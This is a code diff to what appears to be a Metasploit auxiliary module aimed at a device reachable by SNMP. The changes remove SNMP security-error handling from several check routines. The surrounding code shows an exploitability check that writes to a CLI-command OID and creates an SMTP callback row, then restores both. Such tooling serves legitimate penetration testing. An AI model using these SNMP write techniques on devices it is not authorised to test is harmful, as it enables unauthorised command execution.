@@ -198,7 +198,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Appears("Reversible writes and the non-CLI SMTP callback test indicate exploitability on #{version_text}; restoration was confirmed")
   rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout => e
     Exploit::CheckCode::Unknown("SNMP connection failed: #{e.message}")
-  rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError, ::SNMP::SecurityError => e
+  rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError => e
     Exploit::CheckCode::Unknown("SNMP processing failed: #{e.message}")
   rescue StandardError => e
     Exploit::CheckCode::Unknown("Unexpected check failure: #{e.message}")
@@ -227,7 +227,7 @@ class MetasploitModule < Msf::Auxiliary
       @cli_output = extract_cli_output(@smtp_message)
     rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout => e
       processing_error = { type: :unreachable, message: "SNMP communication failed: #{e.message}" }
-    rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError, ::SNMP::SecurityError => e
+    rescue ::SNMP::UnsupportedVersion, ::SNMP::ParseError => e
       processing_error = { type: :unexpected_reply, message: "SNMP processing failed: #{e.message}" }
     rescue Msf::Auxiliary::Failed => e
       module_failure = e
@@ -575,14 +575,14 @@ class MetasploitModule < Msf::Auxiliary
       attempted = true
       writable = set_varbinds('Check CLI-control write', [string_varbind(CLI_COMMAND_OID, canary)], fatal: false)
       writable &&= read_oid(CLI_COMMAND_OID).to_s == canary
-    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
+    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
       vprint_warning("CLI-control writable check failed: #{e.message}")
     ensure
       if attempted
         begin
           set_varbinds('Check CLI-control restore', [string_varbind(CLI_COMMAND_OID, original)], fatal: false)
           restored = read_oid(CLI_COMMAND_OID).to_s == original.to_s
-        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
+        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
           vprint_warning("CLI-control restoration failed: #{e.message}")
         end
       end
@@ -604,14 +604,14 @@ class MetasploitModule < Msf::Auxiliary
       writable &&= read_oid(status_oid).to_i == ROW_STATUS_ACTIVE
       writable &&= read_oid(port_oid).to_i == SMTP_PORT
       reachable = verify_smtp_server(fatal: false) if writable
-    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
+    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
       vprint_warning("SMTP-row writable check failed: #{e.message}")
     ensure
       if attempted
         begin
           set_varbinds('Check SMTP-row destroy', [integer_varbind(status_oid, ROW_STATUS_DESTROY)], fatal: false)
           restored = exception_value?(read_oid(status_oid))
-        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError, ::SNMP::SecurityError => e
+        rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::ParseError => e
           vprint_warning("SMTP-row restoration failed: #{e.message}")
         end
       end
